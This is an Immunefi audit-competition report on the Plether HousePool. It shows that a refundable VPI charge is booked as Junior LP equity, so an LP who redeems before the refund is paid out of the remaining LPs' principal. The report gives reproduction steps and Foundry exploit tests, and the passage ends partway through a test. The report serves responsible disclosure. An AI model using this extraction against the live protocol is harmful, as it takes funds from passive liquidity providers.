# \#99004 [SC-Critical] HousePool counts a refundable VPI charge as LP equity, so an exiting Junior LP is paid the closing trader's rebate by the remaining LPs

**Submitted on Nov 11th 2026 at 11:57:41 UTC by @hybridthegeek for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99004
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

HousePool prices Junior redemptions on a principal figure that includes a positive VPI charge as soon as a position opens. The same charge is refundable to the trader when the position closes. A Junior LP that redeems between the charge and the refund is paid a share of money the pool still owes the trader, and the LPs that remain after the exit fund the rebate. On a 3.0M USDG pool with a 1.19M USDG open, an exiting 60% LP gains 1,416.10 USDG at zero trading cost while the passive 40% LP loses 940.10 USDG, which is 0.078% of its claim. The trigger is an ordinary ERC-7540 redeem request and a permissionless epoch settlement. No owner, pauser, guardian, or keeper role is involved.

## Vulnerability Details

HousePool is the LP vault for the perps market. It holds Senior and Junior capital, tracks `seniorPrincipal` and `juniorPrincipal`, and prices redemptions on the Junior principal during an epoch settlement. The settlement path is `HousePool._fundRedemptionPhase`, which sets `juniorPhase.pricingPrincipal = juniorPrincipal`:

```solidity
// packages/perps/src/HousePool.sol, lines 839-841
RedemptionPhase memory juniorPhase;
juniorPhase.pricingPrincipal = juniorPrincipal;
juniorPhase.pricingSupply = _juniorShareSupply();
```

When a position opens, the engine charges VPI. A skew-increasing open pays a positive charge. `CfdEngineSettlementSidecar.executeOpen` takes the positive `tradeCostAssets`, subtracts the protocol fee, and records the remainder as HousePool revenue with `CashArrived`:

```solidity
// packages/perps/src/CfdEngineSettlementSidecar.sol, lines 454-463
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool())
            .recordClaimantInflow(
                poolCashInflowAssets,
                IHousePool.ClaimantInflowKind.Revenue,
                IHousePool.ClaimantInflowCashMode.CashArrived
            );
    }
}
```

In `HousePool.recordClaimantInflow`, a `CashArrived` inflow adds to `accountedAssets`:

```solidity
// packages/perps/src/HousePool.sol, lines 640-642
if (cashMode == IHousePool.ClaimantInflowCashMode.CashArrived) {
    accountedAssets += amount;
}
```

The next `_reconcile` distributes the higher physical equity into the tranche principal, so `juniorPrincipal` includes the charge. The redemption then prices on that higher principal.

The charge is not revenue. `CloseAccountingLib.buildCloseState` computes the proportional accrual and clamps the close VPI delta so the lifetime VPI never goes negative:

```solidity
// packages/perps/src/libraries/CloseAccountingLib.sol, lines 112-118
// Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks
// where an attacker opens at high depth, reduces pool depth, then closes to extract a
// net-negative lifetime VPI rebate. This rule is identical in live and oracle-frozen markets; frozen-market
// stale-price risk is priced separately through frozenSpreadAssets.
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

The clamp makes the close return the accrued charge. `CfdEngineSettlementSidecar.executeClose` pays the rebate from pool cash:

```solidity
// packages/perps/src/CfdEngineSettlementSidecar.sol, lines 621-624
if (delta.actionRebatePaidAssets > 0) {
    IHousePool(host.pool()).payOut(address(clearinghouse), delta.actionRebatePaidAssets);
    clearinghouse.settleAssets(delta.account, int256(delta.actionRebatePaidAssets));
}
```

The trader's VPI round trip is therefore zero, and its only cost is the two execution fees. Between the open and the close, the redemption price includes the charge. An LP that exits in that window is paid its share of money the pool still owes the trader. The LPs that remain after the exit own the rebate and fund it.

The code already treats the opposite sign as a liability. `_negativeVpiReserveTarget` locks `max(-vpiAccrued, 0)` as `vpiRebateReserveAssets`, and the withdrawal guard blocks a withdrawal when the reserve is underfunded (`CfdEngineSettlementSidecar.sol:298-300` and `:373-379`). Positive VPI has no symmetric reserve. The same lifetime accrual is revenue on one side and a reserve on the other.

The preconditions are narrow and all public. The exiting address must be a Junior LP with a matured redeem request. A live position must carry a positive VPI accrual at the settlement. The settlement must run before the position closes. `settleLpEpoch` is permissionless, so the exit, the settlement, and the claim can be one transaction. The exiting LP does not need to be the trader. The POC proves both forms: the trader exits its own pool position, and an unrelated LP exits while a third party trades.

The closest known items do not describe this root cause:

| Item | Where | Why it does not cover this |
|---|---|---|
| Cecuro MED-24 and MED-29 | Cecuro AI audit, 26 October 2026 | Epoch refund accounting and redemption rounding. This is a refundable liability counted in the redemption base, not a rounding rule. |
| Cecuro LOW-13 and LOW-63 | same report | Dust-level rounding. The measured transfer here is 940.10 USDG on a 1.2M claim. |
| AI scan, temporary pool liquidity can reduce a skew-increasing close charge, and can amplify a skew-reducing close rebate | AI scan findings, 15 October 2026 | Those items change the size of the charge by changing depth at close. Here the lifetime clamp fixes the rebate at the accrual, and the value leaves at the redemption price. |
| AI scan, deferred trader claims inflate open skew capacity and reduce VPI | same file | Gross versus net depth for the charge. It does not address the timing of a refundable inflow in the LP equity base. |
| `SECURITY.md`, VPI limitations | `packages/perps/SECURITY.md` | The lifetime clamp is described as blocking trading round trips. This is an LP exit, which the clamp does not cover. |
| `SECURITY.md`, exact symmetric LP NAV | same file | The terminal snapshot excludes VPI from the price book, but the cash still raises the equity that the redemption is priced on. That gap is the finding. |
| SC pre-audit SC-M3 | SC Audit Studio pre-audit, 26 October 2026 | Negative VPI omitted from initial margin. The sign and the path are different. |

No item in the known-issue list describes an LP exiting between a positive VPI charge and its refund. The finding does not depend on an incomplete fix for a known item.

## Impact Details

The POC runs at the release parameters in `DEPLOYMENT.md`: `vpiFactor 0.01e18`, `maxSkewRatio 0.4e18`, `executionFeeBps 4`, maintenance margin 10 bps, initial margin 20 bps, and one-hour LP epochs. The measured values are:

| Quantity | Value |
|---|---|
| Junior pool depth | 3,000,000.00 USDG (1,200,000.00 from the passive LP and 1,800,000.00 from the exiting LP) |
| Open notional | 1,190,000.00 USDG, 39.7% of depth and inside the 0.4 skew cap |
| VPI charge at open | 2,360.17 USDG |
| Redemption paid to the exiting 60% LP | 1,801,416.10 USDG on a 1,800,000.00 deposit |
| Exiting LP net, front-run form, no trading fee | +1,416.10 USDG |
| Passive 40% LP claim before and after | 1,200,000.00 to 1,199,059.90 USDG, a loss of 940.10 USDG (0.078%) |
| Same account as trader, after 952.31 USDG of execution fees | +463.90 USDG |
| Control, same trade and no LP exit | trader -667.34 USDG, passive LP +191.14 USDG |
| Control, LP exit and no charge | -17 atoms for the exiting LP, -6 atoms for the passive LP |

The controls isolate the cause. Without the LP exit the trader pays the two execution fees and loses 667.34 USDG. Without the charge the redemption is neutral to the atom. The swing appears only when a redemption is priced while the refundable charge is in the equity base.

The loss is Junior principal, not unclaimed yield. The passive LP deposited 1,200,000.00 USDG and its redeemable claim falls to 1,199,059.90 USDG. The exiting LP is paid the difference. That is why the impact row is direct theft of user funds and not theft of unclaimed yield.

The scale follows the charge formula. At the 40% skew cap the charge is 8 bps of pool depth. An LP with share `f` captures `f * 8 bps * D` per max-skew open. The pool can reach 50M USDG, but only within the Senior share limit of 80% and the Senior cap of 40M. At `S = 40M` and `J = 10M` the Junior withdrawal-ratio cap is zero, so that configuration cannot be used. A reachable 50M configuration with `S` around 30.8M and `J` around 19.2M leaves a Junior cap of 11.52M, which is 60% of `J`. The charge on 50M is 40,000 USDG per max-skew open, and a 60% Junior LP that exits within the cap captures 24,000 USDG. The ratio cap bounds the exiting share but does not prevent the extraction.

The extraction repeats. The cadence test runs two complete redeem, open, settle, claim, close, and re-deposit cycles. The exiting account gains 463.90 USDG in the first cycle and 464.56 USDG in the second, and the passive LP falls 940.10 USDG per cycle. The cycle is gated by the one-hour epoch and the one-hour deposit cooldown, which allows roughly one full exit and re-entry every three to four hours. The attack is permissionless at every step.

The measured victim is the Junior tranche. The POC does not show a Senior loss: the charge is folded into Junior principal and the waterfall keeps the Senior claim ahead. The trader's margin is not at risk from the VPI round trip, because the charge is returned at close and the round trip costs only the execution fees.

Why Critical and not a lower row: the victim's redeemable principal falls below its deposit while the exiting LP is paid the difference. High would apply only if the value taken were unclaimed yield. The griefing row does not apply because the attacker profits. The epoch clock and the Junior withdrawal-ratio cap limit the rate and the exiting share; they do not remove the transfer.

## References

- `HousePool.sol`, redemption pricing: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L839-L841
- `CfdEngineSettlementSidecar.sol`, open revenue booking: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L454-L463
- `CfdEngineSettlementSidecar.sol`, close rebate payment: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L621-L624
- `CloseAccountingLib.sol`, lifetime clamp: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L112-L118
- `HousePool.sol`, `CashArrived` accounting: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L640-L642
- `DEPLOYMENT.md`, release parameters: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md
- `SECURITY.md`, VPI limitations and symmetric LP NAV: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md
- Cecuro AI audit: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf
- SC Audit Studio pre-audit: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-pre-audit-report.pdf
- AI scan findings: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md

## Proof of Concept

## Proof of Concept

### Environment

- Repository: `immunefi-team/audit-comp-plether`, commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`.
- Toolchain used: `forge 1.7.1`, `solc 0.8.35`, `via_ir = true`, optimizer runs 200. The competition does not pin a forge version; the PoC runs in the repository's Foundry suite at the commit in scope.
- Operating system: Windows 11 with Git Bash. The suite also runs on Linux with the same commands.
- No in-scope contract is modified. `git status --porcelain -- packages/perps/src` is empty after the run.
- `MockPyth` replaces the Pyth price feeds (two synthetic feeds instead of six) and `MockSettlementToken` replaces USDG. Both are outside the scope of the audit competition. Every other contract on the path is the repository code at the commit.
- Files: `packages/perps/test/submission/ReleaseBase.sol`, `packages/perps/test/submission/LpVpiExtraction.t.sol`, and `packages/perps/test/submission/LpVpiCadence.t.sol`.

### Steps

```bash
git clone https://github.com/immunefi-team/audit-comp-plether
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
mkdir -p packages/perps/test/submission
# save the first source file below as packages/perps/test/submission/ReleaseBase.sol
# save the second source file below as packages/perps/test/submission/LpVpiExtraction.t.sol
# save the third source file below as packages/perps/test/submission/LpVpiCadence.t.sol
forge test --root packages/perps --match-path test/submission/LpVpiExtraction.t.sol -vv
forge test --root packages/perps --match-path test/submission/LpVpiCadence.t.sol -vv
```

The first command runs four tests. The second runs the two-cycle cadence test. The helper file is not a test; it applies the release parameters and exposes the production order and LP surfaces.

### Expected result

```text
Ran 4 tests for test/submission/LpVpiExtraction.t.sol:LpVpiExtractionTest
[PASS] test_Control_RedeemWithoutCharge() (gas: 943821)
Logs:
  no-charge control: attacker pnl signed -17
  no-charge control: honest pnl signed -6

[PASS] test_Control_SameTradeWithoutLpExit() (gas: 4718766)
Logs:
  control principal before 3000000998412
  control supply before 3004745486813691
  control att shares 1802846692093623
  control honest shares 1201897794720068
  control principal after open 3000000998412
  control senior pending 1001597
  control junior pending 3002361163496
  control principal after close 3000000998412
  control att clearinghouse 299045944036
  control att claim 0
  control att shares 1802846692093623
  control att shares value 1800286713477
  control principal end 3000000998412
  control supply end 3004745486813691
  control: attacker pnl 667342487
  control: honest pnl 191142322

[PASS] test_Finding_LpExitBetweenChargeAndRebate() (gas: 5520784)
Logs:
  vpi charged at open 2360165093
  junior principal after open (not yet reconciled) 3000000998412
  senior pending 1001615
  junior pending (includes charge) 3002361163478
  pool free assets 1809387165093
  epoch 1 redemption paid 1801416098568
  escrow shares left 0
  attacker start 2100000000000
  attacker end 2100463896357
  attacker pnl 463896357
  attacker loss 0
  honest start 1199999999987
  honest end 1199059904389
  honest pnl 0
  honest loss 940095598
  junior principal before 3000000998412
  junior principal after 1200945064910
  junior supply before 3004745486813691
  junior supply after 1201898794720068

[PASS] test_Finding_ThirdPartyChargeFrontRun() (gas: 5428013)
Logs:
  third-party vpi charged 2360165093
  lp exit paid 1801416098568
  front-run attacker pnl 1416098568
  front-run attacker loss 0
  front-run honest pnl 0
  front-run honest loss 940095598

Suite result: ok. 4 passed; 0 failed; 0 skipped; finished in 48.71ms (72.78ms CPU time)

Ran 1 test suite in 51.64ms (48.71ms CPU time): 4 tests passed, 0 failed, 0 skipped (4 total tests)
```

```text
Ran 1 test for test/submission/LpVpiCadence.t.sol:LpVpiCadenceTest
[PASS] test_Finding_ExtractionRepeatsAcrossEpochs() (gas: 10549728)
Logs:
  cycle 1 attacker pnl 463896363
  cycle 2 attacker pnl 464560813
  honest before 1199999999987
  honest after cycle 1 1199059904389
  honest after cycle 2 1198119144328

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 78.81ms (54.20ms CPU time)

Ran 1 test suite in 130.31ms (78.81ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

Gas and timing vary by machine. The pass condition is the asserted direction in each test: the exiting LP profits, the passive LP loses in both finding tests, the exiting LP fully exits in the same-account test, and the no-charge control is neutral within 1e6 atoms. In the same-account test the passive loss also exceeds the exiting gain, because the exiting account pays the execution fees.

### What each test asserts

- `test_Finding_LpExitBetweenChargeAndRebate`: the exiting LP is also the trader. It requests a redemption one epoch before the attack, opens a max-skew position that pays 2,360.17 USDG of VPI, settles the epoch while the position is live, claims the funded redemption, then closes and withdraws. It asserts that the exiting account profits, the passive LP loses, the passive loss exceeds the exiting gain, and the vault holds no remaining escrow shares for the exiting account.
- `test_Finding_ThirdPartyChargeFrontRun`: an unrelated LP requests a redemption, a third party opens the max-skew position, the LP settles and claims, and the third party closes. It asserts that a non-trading LP profits at the passive LP's expense. This form pays no trading fee.
- `test_Control_SameTradeWithoutLpExit`: the same open and close with no LP exit. It asserts that the trader loses the two execution fees, which shows that the extraction needs the redemption.
- `test_Control_RedeemWithoutCharge`: the same redemption with no open and no charge. It asserts that the redemption is neutral within 1e6 atoms, which shows that the extraction needs the charge.
- `test_Finding_ExtractionRepeatsAcrossEpochs`: two complete cycles. It asserts that the extraction repeats and records the per-cycle gain and the passive LP's decline.

### What the PoC shows and what it does not show

It shows that a positive VPI charge is booked as LP equity, that a redemption during the charge's life is priced on it, that the closing trader receives the charge back from pool cash, and that the exiting LP's gain is funded by the passive LP. It shows the effect at the release risk parameters on a 3.0M pool, and it shows that the effect repeats across epochs.

It does not show live trading flow, the frequency of positive VPI charges on mainnet, or a 50M pool. The scale paragraph is arithmetic from the charge formula and the pool caps, not a second POC. It does not show a Senior tranche loss. It does not test a fix. The Pyth feeds and USDG are mocks; the rest of the path is the repository code. No transaction is sent to any live network.

### PoC source: packages/perps/test/submission/ReleaseBase.sol

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";

/// @dev Shared harness. Applies the release parameters from packages/perps/DEPLOYMENT.md and only
///      reaches production surfaces: the V3 `commitOrder`, `executeOrder`, `settleLpEpoch` and vault ERC-7540 calls.
///      Replaced by mocks: Pyth (two synthetic feeds rather than six) and USDG. No in-scope contract is modified.
abstract contract ReleaseBase is BasePerpTest {

    /// @dev Monday 2024-03-11 14:00 UTC, outside the frozen and FAD windows.
    uint256 internal constant LIVE_MONDAY = SETUP_TIMESTAMP + 7 days + 4 hours;
    uint256 internal constant RELEASE_MAX_SENIOR_EXPOSURE_ASSETS = 40_000_000e6;
    uint256 internal constant RELEASE_MAX_SENIOR_SHARE_BPS = 8000;

    uint256 private _clientNonce;

    function _riskParams() internal pure virtual override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure virtual override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure virtual override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure virtual override returns (uint256) {
        return 1e6;
    }

    function setUp() public virtual override {
        super.setUp();
        _applyReleaseConfig();
        vm.warp(LIVE_MONDAY);
        vm.roll(block.number + 1);
    }

    function _applyReleaseConfig() internal {
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.minOpenNotionalAssets = 1000e6;
        config.maxPendingOrders = 5;
        config.positionProtectionTriggerBountyAssets = 200_000;
        config.basketMaxConfidenceRatioBps = 10;
        config.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(config);
        _setSeniorCapacity(RELEASE_MAX_SENIOR_EXPOSURE_ASSETS, RELEASE_MAX_SENIOR_SHARE_BPS);
        assertEq(engine.settlementBufferBps(), 25, "release settlementBufferBps");
        assertEq(engine.executionFeeBps(), 4, "release executionFeeBps");
    }

    // --- Production order surface ---

    /// @dev Target price semantics, from the harness adapter: a LONG open or SHORT close uses a floor (1 is unbounded),
    ///      a LONG close or SHORT open uses a ceiling (type(uint256).max is unbounded).
    function _commitV3(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 targetPrice,
        bool isClose
    ) internal returns (uint64 orderId) {
        uint256 maxWindow = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode("order", account, ++_clientNonce)),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: targetPrice,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp) + uint64(maxWindow),
                executionWindowSeconds: uint32(maxWindow),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(account);
        orderId = router.commitOrder(request);
    }

    function _executeV3(
        uint64 orderId,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        bytes[] memory data = _mockPythUpdateData(price);
        result = router.executeOrder{value: 1}(orderId, data);
    }

    /// @dev Permissionless mark refresh through the Router. Required before the first open: commits read the cached mark.
    function _refreshMark(
        uint256 price
    ) internal {
        bytes[] memory data = _mockPythUpdateData(price);
        router.updateMarkPrice{value: 1}(data);
    }

    /// @dev Settles through the route production requires: the Router with live open positions outside the frozen
    ///      state, otherwise the permissionless direct cached-mark path.
    function _settleProduction(
        uint256 price
    ) internal {
        ICfdEngineTypes.TerminalNavSnapshot memory snapshot = engine.terminalNavSnapshot();
        if (snapshot.hasOpenPositions && !engine.isOracleFrozen()) {
            bytes[] memory data = _mockPythUpdateData(price);
            router.settleLpEpoch{value: 1}(data);
        } else {
            pool.settleLpEpoch(0, 0);
        }
    }

    // --- Production LP surface ---

    function _requestDeposit(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal returns (uint256 requestId) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
    }

    function _requestRedeem(
        TrancheVault vault,
        address lp,
        uint256 shares
    ) internal returns (uint256 requestId) {
        vm.prank(lp);
        requestId = vault.requestRedeem(shares, lp, lp);
    }

    /// @dev Requests, warps to the boundary, settles at `price`, claims, and returns to the caller. Warps time.
    function _depositAndClaim(
        TrancheVault vault,
        address lp,
        uint256 amount,
        uint256 price
    ) internal returns (uint256 shares) {
        uint256 requestId = _requestDeposit(vault, lp, amount);
        uint256 activation = vault.depositEpochStart(requestId);
        if (block.timestamp < activation) {
            vm.warp(activation);
        }
        _settleProduction(price);
        vm.prank(lp);
        shares = vault.claimDeposit(requestId, amount, lp, lp);
    }

}
```

### PoC source: packages/perps/test/submission/LpVpiExtraction.t.sol

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {ReleaseBase} from "./ReleaseBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {console2} from "forge-std/console2.sol";

/// @title LP exit priced on a refundable VPI charge
/// @notice The open books a positive VPI charge as pool revenue, the charge is refundable at close, and a
///         Junior LP that redeems between the two is paid the charge. Production surfaces only; mocks are Pyth
///         and USDG. No in-scope contract is modified.
contract LpVpiExtractionTest is ReleaseBase {

    address internal constant HONEST = address(0x1111111111111111111111111111111111111111);
    address internal constant ATTACKER = address(0x2222222222222222222222222222222222222222);

    uint256 internal constant PAR = 1e8;
    uint256 internal constant HONEST_CAPITAL = 1_200_000e6;
    uint256 internal constant ATTACKER_CAPITAL = 1_800_000e6;
    uint256 internal constant TRADER_FUNDING = 300_000e6;
    uint256 internal constant POST_MARGIN = 100_000e6;
    uint256 internal constant SIZE = 1_190_000e18; // 39.7% of 3.0M depth, inside maxSkewRatio 0.4

    function setUp() public override {
        super.setUp();

        _depositAndClaim(juniorVault, HONEST, HONEST_CAPITAL, PAR);

        uint256 attRequest = _requestDeposit(juniorVault, ATTACKER, ATTACKER_CAPITAL);
        uint256 activation = juniorVault.depositEpochStart(attRequest);
        if (block.timestamp < activation) {
            vm.warp(activation);
        }
        _settleProduction(PAR);
        vm.prank(ATTACKER);
        juniorVault.claimDeposit(attRequest, ATTACKER_CAPITAL, ATTACKER, ATTACKER);

        _fundTrader(ATTACKER, TRADER_FUNDING);

        vm.warp(block.timestamp + 1 hours + 1);
        vm.roll(block.number + 1);
    }

    // --- measurement helpers ---

    function _attackerTotal() internal view returns (uint256) {
        return settlementToken.balanceOf(ATTACKER) + clearinghouse.balanceAssets(ATTACKER)
            + engine.traderClaimBalanceAssets(ATTACKER)
            + juniorVault.convertToAssets(juniorVault.balanceOf(ATTACKER));
    }

    function _honestValue() internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(HONEST));
    }

    function _openMaxSkew() internal returns (uint256 posSize) {
        _refreshMark(PAR);
        uint64 id = _commitV3(ATTACKER, CfdTypes.Side.LONG, SIZE, POST_MARGIN, 1, false);
        _executeV3(id, PAR);
        (posSize,,,,,,) = engine.positions(ATTACKER);
    }

    function _closeAll(
        uint256 posSize
    ) internal {
        uint64 id = _commitV3(ATTACKER, CfdTypes.Side.LONG, posSize, 0, type(uint256).max, true);
        _executeV3(id, PAR);
    }

    function _withdrawTraderCash() internal {
        uint256 cash = clearinghouse.balanceAssets(ATTACKER);
        if (cash > 0) {
            vm.prank(ATTACKER);
            clearinghouse.withdraw(ATTACKER, cash);
        }
    }

    function _claimFunded(
        uint256 redeemId
    ) internal returns (uint256 assets) {
        uint256 shares = juniorVault.claimableRedeemRequest(redeemId, ATTACKER);
        assets = juniorVault.claimableRedeemAssets(redeemId, ATTACKER);
        if (shares > 0) {
            vm.prank(ATTACKER);
            juniorVault.claimRedeem(redeemId, shares, ATTACKER, ATTACKER);
        }
    }

    // =====================================================================
    // 1. The finding
    // =====================================================================

    function test_Finding_LpExitBetweenChargeAndRebate() public {
        uint256 start = ATTACKER_CAPITAL + TRADER_FUNDING;
        uint256 honestBefore = _honestValue();
        uint256 attShares = juniorVault.balanceOf(ATTACKER);
        uint256 supplyBefore = juniorVault.totalSupply();
        uint256 principalBefore = pool.juniorPrincipal();

        // The LP exit must be requested one epoch before the attack epoch.
        uint256 redeemId = _requestRedeem(juniorVault, ATTACKER, attShares);
        vm.warp(((block.timestamp / 1 hours) + 2) * 1 hours);
        vm.roll(block.number + 2);

        // Open: the reversible VPI charge arrives in the pool as revenue.
        uint256 posSize = _openMaxSkew();
        (, , , , , , int256 vpiAccrued) = engine.positions(ATTACKER);
        console2.log("vpi charged at open", uint256(vpiAccrued));
        console2.log("junior principal after open (not yet reconciled)", pool.juniorPrincipal());
        (uint256 seniorP, uint256 juniorP, ,) = pool.getPendingTrancheState();
        console2.log("senior pending", seniorP);
        console2.log("junior pending (includes charge)", juniorP);
        console2.log("pool free assets", pool.getFreeAssets());

        // Settle while the position and its refundable charge are live, then claim the funded redemption.
        _settleProduction(PAR);
        uint256 funded1 = _claimFunded(redeemId);
        console2.log("epoch 1 redemption paid", funded1);

        // Close: the charge is refunded to the trader from the remaining pool.
        _closeAll(posSize);
        _withdrawTraderCash();

        // Free-cash cap: if part of the request is still queued, finish it once the position is gone.
        if (juniorVault.claimableRedeemRequest(redeemId, ATTACKER) > 0
            || juniorVault.balanceOf(address(juniorVault)) > 0) {
            _settleProduction(PAR);
            uint256 funded2 = _claimFunded(redeemId);
            console2.log("epoch 2 redemption paid", funded2);
        }
        console2.log("escrow shares left", juniorVault.balanceOf(address(juniorVault)));

        uint256 attEnd = _attackerTotal();
        uint256 honestAfter = _honestValue();

        int256 attackerPnl = int256(attEnd) - int256(start);
        int256 honestPnl = int256(honestAfter) - int256(honestBefore);

        console2.log("attacker start", start);
        console2.log("attacker end", attEnd);
        console2.log("attacker pnl", attackerPnl >= 0 ? uint256(attackerPnl) : 0);
        console2.log("attacker loss", attackerPnl < 0 ? uint256(-attackerPnl) : 0);
        console2.log("honest start", honestBefore);
        console2.log("honest end", honestAfter);
        console2.log("honest pnl", honestPnl >= 0 ? uint256(honestPnl) : 0);
        console2.log("honest loss", honestPnl < 0 ? uint256(-honestPnl) : 0);
        console2.log("junior principal before", principalBefore);
        console2.log("junior principal after", pool.juniorPrincipal());
        console2.log("junior supply before", supplyBefore);
        console2.log("junior supply after", juniorVault.totalSupply());

        // The finding: the redeeming LP profits at the passive LP's expense, out of a refundable charge.
        assertGt(attackerPnl, 0, "attacker must profit");
        assertLt(honestPnl, 0, "passive LP must lose");
        assertGt(uint256(-honestPnl), uint256(attackerPnl), "the passive LP funds the attacker and the fee");
        assertEq(juniorVault.balanceOf(address(juniorVault)), 0, "attacker fully exited");
    }

    // =====================================================================
    // 2. Same root cause without the attacker trading at all
    // =====================================================================

    /// @dev A third party opens and pays the charge; an unrelated LP exits in the inflated window; the trader then
    ///      closes and the remaining LP funds the rebate. The exiting LP pays no trading fee, so any share of the pool
    ///      profits.
    function test_Finding_ThirdPartyChargeFrontRun() public {
        address trader = address(0x3333333333333333333333333333333333333333);
        _fundTrader(trader, TRADER_FUNDING);

        uint256 start = ATTACKER_CAPITAL + TRADER_FUNDING;
        uint256 honestBefore = _honestValue();
        uint256 attShares = juniorVault.balanceOf(ATTACKER);

        uint256 redeemId = _requestRedeem(juniorVault, ATTACKER, attShares);
        vm.warp(((block.timestamp / 1 hours) + 2) * 1 hours);
        vm.roll(block.number + 2);

        // The third party's open arrives first and books its charge.
        _refreshMark(PAR);
        uint64 openId = _commitV3(trader, CfdTypes.Side.LONG, SIZE, POST_MARGIN, 1, false);
        _executeV3(openId, PAR);
        (uint256 posSize,,,,,,) = engine.positions(trader);
        (, , , , , , int256 vpiAccrued) = engine.positions(trader);
        console2.log("third-party vpi charged", uint256(vpiAccrued));

        // The unrelated LP exits at the inflated NAV, paying nothing.
        _settleProduction(PAR);
        uint256 paid1 = _claimFunded(redeemId);
        console2.log("lp exit paid", paid1);

        // The third party closes; the rebate comes from the remaining pool.
        uint64 closeId = _commitV3(trader, CfdTypes.Side.LONG, posSize, 0, type(uint256).max, true);
        _executeV3(closeId, PAR);
        if (juniorVault.balanceOf(address(juniorVault)) > 0) {
            _settleProduction(PAR);
            _claimFunded(redeemId);
        }

        int256 attackerPnl = int256(_attackerTotal()) - int256(start);
        int256 honestPnl = int256(_honestValue()) - int256(honestBefore);
        console2.log("front-run attacker pnl", attackerPnl >= 0 ? uint256(attackerPnl) : 0);
        console2.log("front-run attacker loss", attackerPnl < 0 ? uint256(-attackerPnl) : 0);
        console2.log("front-run honest pnl", honestPnl >= 0 ? uint256(honestPnl) : 0);
        console2.log("front-run honest loss", honestPnl < 0 ? uint256(-honestPnl) : 0);

        assertGt(attackerPnl, 0, "a non-trading LP profits from the outstanding charge");
        assertLt(honestPnl, 0, "the remaining LP funds it");
